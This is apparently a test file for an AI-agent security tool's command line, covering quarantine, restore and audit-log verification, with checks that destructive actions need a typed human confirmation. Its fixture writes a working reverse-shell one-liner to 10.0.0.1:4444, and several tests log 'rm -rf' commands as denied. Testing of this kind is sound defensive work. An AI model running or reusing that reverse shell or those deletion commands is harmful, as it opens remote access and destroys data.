/**
 * `aidr quarantine list|show|release|delete`, `aidr restore` and
 * `aidr audit verify|rotate-key`.
 *
 * Release, delete, restore and rotate-key change files or evidence, so the tests
 * pin that they refuse to act without a human confirmation; verify must exit
 * non-zero on the first broken record.
 */

import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PassThrough } from "node:stream";
import { AutoQuarantine, AutoRollback, logVerdict, type Verdict } from "@singularityrd/aidr-core";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { auditRotateKeyCommand, auditVerifyCommand } from "../commands/audit.js";
import {
	quarantineDeleteCommand,
	quarantineListCommand,
	quarantineReleaseCommand,
	quarantineShowCommand,
	restoreCommand,
} from "../commands/quarantine.js";

let home: string;
let originalHome: string | undefined;
let out: string[];
let err: string[];

function ttyStreams(answer: string) {
	const input = Object.assign(new PassThrough(), { isTTY: true });
	const output = Object.assign(new PassThrough(), { isTTY: true });
	output.resume();
	setTimeout(() => input.write(`${answer}\n`), 10);
	return { input, output };
}

function nonTtyStreams() {
	const output = new PassThrough();
	output.resume();
	return { input: new PassThrough(), output };
}

function aidrDir(): string {
	return join(home, ".singularity-aidr");
}

function writeConfig(config: Record<string, unknown>): void {
	writeFileSync(join(aidrDir(), "config.json"), JSON.stringify(config));
}

async function quarantineOne(name = "evil.sh"): Promise<{ id: string; path: string }> {
	const work = join(home, "work");
	mkdirSync(work, { recursive: true });
	const path = join(work, name);
	writeFileSync(path, "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n");
	const store = new AutoQuarantine({
		quarantineDir: "~/.singularity-aidr/quarantine",
		retentionDays: 30,
		notifyChannels: [],
	});
	const item = await store.quarantine(path, "CLT-CMD-003", {
		reason: "agent_written_file_classified_malicious",
		rule_ids: ["CLT-CMD-003"],
	});
	return { id: item.id, path };
}

beforeEach(() => {
	originalHome = process.env.HOME;
	home = mkdtempSync(join(tmpdir(), "aidr-quarantine-cli-"));
	mkdirSync(aidrDir(), { recursive: true, mode: 0o700 });
	process.env.HOME = home;
	writeConfig({ response: { quarantine: { enabled: true } } });
	out = [];
	err = [];
	vi.spyOn(console, "log").mockImplementation((...args: unknown[]) => {
		out.push(args.map(String).join(" "));
	});
	vi.spyOn(console, "error").mockImplementation((...args: unknown[]) => {
		err.push(args.map(String).join(" "));
	});
	process.exitCode = undefined;
});

afterEach(() => {
	vi.restoreAllMocks();
	process.exitCode = undefined;
	delete process.env.AIDR_AUDIT_CHAIN_KEY_STORAGE;
	if (originalHome === undefined) delete process.env.HOME;
	else process.env.HOME = originalHome;
	rmSync(home, { recursive: true, force: true });
});

describe("aidr quarantine", () => {
	it("lists and shows quarantined files with hash, original path and reason", async () => {
		const { id, path } = await quarantineOne();
		await quarantineListCommand({ json: true });
		const listing = JSON.parse(out.join("\n"));
		expect(listing.enabled).toBe(true);
		expect(listing.items).toHaveLength(1);
		expect(listing.items[0]).toMatchObject({ id, original_path: path, threat_id: "CLT-CMD-003" });
		expect(listing.items[0].sha256).toMatch(/^[0-9a-f]{64}$/);

		out = [];
		await quarantineShowCommand(id.slice(0, 8));
		const shown = out.join("\n");
		expect(shown).toContain(path);
		expect(shown).toContain("agent_written_file_classified_malicious");
	});

	it("refuses release and delete without an interactive confirmation", async () => {
		const { id, path } = await quarantineOne();
		await quarantineReleaseCommand(id, {}, { streams: nonTtyStreams() });
		expect(process.exitCode).toBe(1);
		expect(existsSync(path)).toBe(false);
		process.exitCode = undefined;
		await quarantineDeleteCommand(id, { yes: true }, { env: {}, streams: nonTtyStreams() });
		expect(process.exitCode).toBe(1);
		expect(err.join("\n")).toContain("AIDR_OPERATOR_NONINTERACTIVE");
	});

	it("releases a file back to its original path after the operator types the word", async () => {
		const { id, path } = await quarantineOne();
		await quarantineReleaseCommand(id, {}, { streams: ttyStreams("release") });
		expect(process.exitCode).toBeUndefined();
		expect(readFileSync(path, "utf8")).toContain("/dev/tcp/");
		out = [];
		await quarantineListCommand({ json: true });
		expect(JSON.parse(out.join("\n")).items).toEqual([]);
	});

	it("deletes a quarantined file permanently after confirmation", async () => {
		const { id, path } = await quarantineOne();
		await quarantineDeleteCommand(id, {}, { streams: ttyStreams("delete") });
		expect(process.exitCode).toBeUndefined();
		expect(existsSync(path)).toBe(false);
		out = [];
		await quarantineListCommand({ json: true });
		expect(JSON.parse(out.join("\n")).items).toEqual([]);
	});

	it("reports an unknown id", async () => {
		await quarantineShowCommand("00000000-nope");
		expect(process.exitCode).toBe(1);
	});
});

describe("aidr restore", () => {
	it("lists snapshots and restores one after confirmation", async () => {
		const target = join(home, "project", "settings.json");
		mkdirSync(join(home, "project"), { recursive: true });
		writeFileSync(target, "original");
		const rollback = new AutoRollback(undefined, undefined, "~/.singularity-aidr/snapshots");
		const snapshot = await rollback.createSnapshot([target], "allow-file_write");

		await restoreCommand(undefined, { list: true, json: true });
		expect(JSON.parse(out.join("\n"))[0].id).toBe(snapshot.id);

		writeFileSync(target, "clobbered");
		// A target that changed is refused unless the operator says to overwrite it.
		await restoreCommand(snapshot.id, {}, { streams: ttyStreams("restore") });
		expect(process.exitCode).toBe(1);
		expect(readFileSync(target, "utf8")).toBe("clobbered");
		expect(err.join("\n")).toContain("target_changed");

		process.exitCode = undefined;
		await restoreCommand(
			snapshot.id,
			{ overwriteChanged: true },
			{ streams: ttyStreams("restore") },
		);
		expect(process.exitCode).toBeUndefined();
		expect(readFileSync(target, "utf8")).toBe("original");
		expect(readFileSync(join(aidrDir(), "audit.jsonl"), "utf8")).toContain("snapshot_restore");
	});

	it("refuses to restore without confirmation", async () => {
		const target = join(home, "a.txt");
		writeFileSync(target, "a");
		const rollback = new AutoRollback(undefined, undefined, "~/.singularity-aidr/snapshots");
		const snapshot = await rollback.createSnapshot([target], "allow-file_write");
		await restoreCommand(snapshot.id, {}, { streams: nonTtyStreams() });
		expect(process.exitCode).toBe(1);
	});
});

describe("aidr audit verify / rotate-key", () => {
	const denial: Verdict = {
		decision: "deny",
		category: "destructive_command",
		confidence: 1,
		severity: "critical",
		source: "heuristic",
		reasons: ["test"],
		artifacts: [],
		matchedThreatId: "CLT-CMD-001",
	};
	const logging = () => ({
		enabled: true,
		log_clean: true,
		path: join(aidrDir(), "audit.jsonl"),
		max_bytes: 5_000_000,
		max_files: 3,
		signed_chain: true,
		chain_key_storage: "file" as const,
	});

	it("exits non-zero when no chain is enabled: nothing verified is not a pass", async () => {
		writeConfig({});
		await auditVerifyCommand({});
		expect(process.exitCode).toBe(1);
		expect(out.join("\n")).toContain("nothing was verified");
	});

	it("verifies a clean chain and names the first tampered record", async () => {
		writeConfig({ audit: { signed_chain: true, key_storage: "file" } });
		for (let i = 0; i < 4; i++) {
			await logVerdict(logging(), `s${i}`, "Bash", { command: `rm -rf /x${i}` }, denial);
		}
		await auditVerifyCommand({ json: true });
		const clean = JSON.parse(out.join("\n"));
		expect(process.exitCode).toBeUndefined();
		expect(clean.ok).toBe(true);
		expect(clean.chains[0]).toMatchObject({
			chain: "verdict_log",
			status: "verified",
			verified: 4,
		});

		const path = join(aidrDir(), "audit.jsonl");
		const lines = readFileSync(path, "utf8").split("\n").filter(Boolean);
		const record = JSON.parse(lines[1] as string);
		record.severity = "info";
		lines[1] = JSON.stringify(record);
		writeFileSync(path, `${lines.join("\n")}\n`);

		out = [];
		await auditVerifyCommand({});
		expect(process.exitCode).toBe(1);
		const text = out.join("\n");
		expect(text).toContain("FAILED");
		expect(text).toContain("hash_mismatch");
		expect(text).toContain(":2 (seq 2)");
	});

	it("rotates the root key only after confirmation", async () => {
		writeConfig({ audit: { signed_chain: true, key_storage: "file" } });
		await logVerdict(logging(), "s", "Bash", { command: "rm -rf /x" }, denial);
		await auditRotateKeyCommand({}, { streams: nonTtyStreams() });
		expect(process.exitCode).toBe(1);
		process.exitCode = undefined;
		await auditRotateKeyCommand({ json: true }, { streams: ttyStreams("rotate") });
		expect(process.exitCode).toBeUndefined();
		const rotation = JSON.parse(out.join("\n"));
		expect(rotation.endorsed).toBe(true);
		await logVerdict(logging(), "s2", "Bash", { command: "rm -rf /y" }, denial);
		out = [];
		await auditVerifyCommand({ json: true });
		expect(JSON.parse(out.join("\n")).chains[0].status).toBe("verified");
	});
});
